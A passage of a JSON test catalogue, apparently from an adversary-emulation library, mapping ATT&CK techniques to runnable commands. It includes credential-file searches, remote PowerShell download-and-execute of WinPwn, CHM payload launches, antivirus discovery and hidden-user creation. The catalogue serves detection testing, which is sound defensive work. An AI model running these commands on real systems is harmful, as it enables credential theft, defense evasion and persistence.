		"phases": ["discovery"]
	},
	{
		"name": "Find AWS credentials",
		"auto_generated_guid": "2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"file_path": {
				"description": "Path to search",
				"type": "string",
				"default": "/"
			}
		},
		"executor": {
			"command": "find #{file_path} -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Extract Browser and System credentials with LaZagne",
		"auto_generated_guid": "9e507bb8-1d30-4e3b-a49b-cb5727d7ea79",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "python2 laZagne.py all\n",
			"elevation_required": true,
			"name": "bash"
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Extract passwords with grep",
		"auto_generated_guid": "bd4cf0d1-7646-474e-8610-78ccf5a097c4",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"file_path": {
				"description": "Path to search",
				"type": "string",
				"default": "/"
			}
		},
		"executor": {
			"command": "grep -ri password #{file_path}\nexit 0\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Extracting passwords with findstr",
		"auto_generated_guid": "0e56bf29-ff49-4ea5-9af4-3b81283fd513",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Access unattend.xml",
		"auto_generated_guid": "367d4004-5fc0-446d-823f-960c74ae52c3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Find and Access Github Credentials",
		"auto_generated_guid": "da4f751a-020b-40d7-b9ff-d433b7799803",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"file_path": {
				"description": "Path to search",
				"type": "string",
				"default": "/home"
			}
		},
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n"
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - sensitivefiles",
		"auto_generated_guid": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Snaffler",
		"auto_generated_guid": "fdd0c913-714b-4c13-b40f-1824d6c015f2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - powershellsensitive",
		"auto_generated_guid": "75f66e03-37d3-4704-9520-3210efbe33ce",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - passhunt",
		"auto_generated_guid": "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive",
			"cleanup_command": "rm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - SessionGopher",
		"auto_generated_guid": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",
		"auto_generated_guid": "aaa87b0e-5232-4649-ae5c-f1724a4b2798",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "List Credential Files via PowerShell",
		"auto_generated_guid": "0d4f2281-f720-4572-adc8-d5bb1618affe",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "List Credential Files via Command Prompt",
		"auto_generated_guid": "b0cdacf6-8949-4ffe-9274-a9643a788e55",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1552.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Compiled HTML Help Local Payload",
		"auto_generated_guid": "5cb87818-0d7c-4469-b7ef-9224107aebe8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_chm_file": {
				"description": "Local .chm payload",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
				"prereq_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"
			}
		],
		"executor": {
			"command": "hh.exe \"#{local_chm_file}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Compiled HTML Help Remote Payload",
		"auto_generated_guid": "0f8af516-9818-4172-922b-42986ef1e81d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_chm_file": {
				"description": "Remote .chm payload",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"
			}
		},
		"executor": {
			"command": "hh.exe #{remote_chm_file}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke CHM with default Shortcut Command Execution",
		"auto_generated_guid": "29d6f0d7-be63-4482-8827-ea77126c1ef7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"chm_file_path": {
				"description": "Default path of CHM",
				"type": "string",
				"default": "Test.chm"
			},
			"hh_file_path": {
				"description": "path of modified HH.exe",
				"type": "path",
				"default": "$env:windir\\hh.exe"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke CHM with InfoTech Storage Protocol Handler",
		"auto_generated_guid": "b4094750-5fc7-4e8e-af12-b4e36bf5e7f6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hh_file_path": {
				"description": "path of modified HH.exe",
				"type": "path",
				"default": "$env:windir\\hh.exe"
			},
			"infotech_storage_handler": {
				"description": "Default InfoTech Storage Protocol Handler",
				"type": "string",
				"default": "its"
			},
			"chm_file_path": {
				"description": "Default path of CHM",
				"type": "string",
				"default": "Test.chm"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke CHM Simulate Double click",
		"auto_generated_guid": "5decef42-92b8-4a93-9eb2-877ddcb9401a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"chm_file_path": {
				"description": "Default path of CHM",
				"type": "string",
				"default": "Test.chm"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke CHM with Script Engine and Help Topic",
		"auto_generated_guid": "4f83adda-f5ec-406d-b318-9773c9ca92e5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"topic_extension": {
				"description": "Default Help Topic",
				"type": "string",
				"default": "html"
			},
			"hh_file_path": {
				"description": "path of modified HH.exe",
				"type": "path",
				"default": "$env:windir\\hh.exe"
			},
			"infotech_storage_handler": {
				"description": "Default InfoTech Storage Protocol Handler",
				"type": "string",
				"default": "its"
			},
			"script_engine": {
				"description": "Default Script Engine",
				"type": "string",
				"default": "JScript"
			},
			"chm_file_path": {
				"description": "Default path of CHM",
				"type": "string",
				"default": "Test.chm"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Invoke CHM Shortcut Command with ITS and Help Topic",
		"auto_generated_guid": "15756147-7470-4a83-87fb-bb5662526247",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"topic_extension": {
				"description": "Default Help Topic",
				"type": "string",
				"default": "html"
			},
			"hh_file_path": {
				"description": "path of modified HH.exe",
				"type": "path",
				"default": "$env:windir\\hh.exe"
			},
			"infotech_storage_handler": {
				"description": "Default InfoTech Storage Protocol Handler",
				"type": "string",
				"default": "its"
			},
			"chm_file_path": {
				"description": "Default path of CHM",
				"type": "string",
				"default": "Test.chm"
			}
		},
		"dependencies": [
			{
				"description": "The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
				"prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
				"get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Decompile Local CHM File",
		"auto_generated_guid": "20cb05e0-1fa5-406d-92c1-84da4ba01813",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_chm_file": {
				"description": "Local .chm payload",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
				"prereq_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"
			}
		],
		"executor": {
			"command": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n",
			"cleanup_command": "del %temp%\\T1218.001.html >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Security Software Discovery",
		"auto_generated_guid": "f92a380f-ced9-491f-b338-95a991418ce2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - powershell",
		"auto_generated_guid": "7f566051-f033-49fb-89de-b6bacab730f0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\nget-process | ?{$_.Description -like \"*mc*\"}\nget-process | ?{$_.ProcessName -like \"*mc*\"}\nget-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - ps (macOS)",
		"auto_generated_guid": "ba62ce11-e820-485f-9c17-6f3c857cd840",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - ps (Linux)",
		"auto_generated_guid": "23b91cd2-c99c-4002-9e41-317c63e024a2",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - pgrep (FreeBSD)",
		"auto_generated_guid": "fa96c21c-5fd6-4428-aa28-51a2fbecdbdc",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - Sysmon Service",
		"auto_generated_guid": "fe613cf3-8009-4446-9a0f-bc78a15b66c9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "fltmc.exe | findstr.exe 385201\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - AV Discovery via WMI",
		"auto_generated_guid": "1553252f-14ea-4d3b-8a08-d7a4211aa945",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets",
		"auto_generated_guid": "015cd268-996e-4c32-8347-94c80c6286ee",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - Windows Defender Enumeration",
		"auto_generated_guid": "d3415a0e-66ef-429b-acf4-a768876954f6",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Security Software Discovery - Windows Firewall Enumeration",
		"auto_generated_guid": "9dca5a1d-f78c-4a8d-accb-d6de67cfed6b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-NetFirewallProfile | Format-Table Name, Enabled\nGet-NetFirewallSetting\nGet-NetFirewallRule | select DisplayName, Enabled, Description\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1518.001",
		"phases": ["discovery"]
	},
	{
		"name": "Malicious Execution from Mounted ISO Image",
		"auto_generated_guid": "e9795c8d-42aa-4ed4-ad80-551ed793d006",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk",
			"cleanup_command": "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1204.003",
		"phases": ["execution"]
	},
	{
		"name": "Create Hidden User using UniqueID < 500",
		"auto_generated_guid": "4238a7f0-a980-4fff-98a2-dfc0a363d507",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"user_name": {
				"description": "username to add",
				"type": "string",
				"default": "APT"
			}
		},
		"executor": {
			"command": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n",
			"cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n",
			"elevation_required": true,
			"name": "sh"
		},
		"attack_technique": "T1564.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Hidden User using IsHidden option",
		"auto_generated_guid": "de87ed7b-52c3-43fd-9554-730f695e7f31",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"user_name": {
				"description": "username to add",
				"type": "string",
				"default": "APT"
			}
		},
		"executor": {
			"command": "sudo dscl . -create /Users/#{user_name} IsHidden 1\n",
			"cleanup_command": "sudo dscl . -delete /Users/#{user_name}\n",
			"elevation_required": true,
			"name": "sh"
		},
		"attack_technique": "T1564.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Hidden User in Registry",
		"auto_generated_guid": "173126b7-afe4-45eb-8680-fa9f6400431c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"user_password": {
				"description": "Password for new user account",
				"type": "string",
				"default": "At0micRedTeam!"
			},
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "AtomicOperator"
			}
		},
		"executor": {
			"command": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n",
			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /f >nul 2>&1\nnet user ${user_name}$ /delete >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Read volume boot sector via DOS device path (PowerShell)",
		"auto_generated_guid": "88f6327e-51ec-4bbf-b2e8-3fea534eab8b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"volume": {
				"description": "Drive letter of the volume to access",
				"type": "string",
				"default": "C:"
			}
		},
		"executor": {
			"command": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows - Discover domain trusts with dsquery",
		"auto_generated_guid": "4700a710-c821-4e17-a3ec-9e4c81d6845f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Windows - Discover domain trusts with nltest",
		"auto_generated_guid": "2e22641d-0498-48d2-b9ff-c71e496ccdbe",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "nltest.exe from RSAT must be present on disk\n",
				"prereq_command": "WHERE nltest.exe >NUL 2>&1\n",
				"get_prereq_command": "echo Sorry RSAT must be installed manually\n"
			}
		],
		"executor": {
			"command": "nltest /domain_trusts\nnltest /trusted_domains\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Powershell enumerate domains and forests",
		"auto_generated_guid": "c58fbc62-8a62-489e-8f2d-3565d7d96f30",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PowerView PowerShell script must exist on disk\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
			},
			{
				"description": "RSAT PowerShell AD admin cmdlets must be installed\n",
				"prereq_command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "Write-Host \"Sorry RSAT must be installed manually\"\n"
			}
		],
		"executor": {
			"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory OUs",
		"auto_generated_guid": "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit) #{optional_args}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1482",
		"phases": ["discovery"]
	},
	{
		"name": "Adfind - Enumerate Active Directory Trusts",
		"auto_generated_guid": "15fe436d-e771-4ff3-b655-2dca9ba52834",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"optional_args": {
				"description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
